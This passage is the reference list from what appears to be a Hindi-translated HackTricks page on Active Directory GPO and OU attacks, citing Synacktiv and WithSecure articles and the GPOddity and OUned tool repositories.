- [12] [GPOddity: NTLM relaying और अन्य माध्यमों से Active Directory GPOs का exploitation](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU मज़ाक कर रहा है? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory में hidden Organizational Units ACL attack vectors का exploitation](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Network पर legitimate Active Directory services का simulation: GPO exploitation का मामला](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
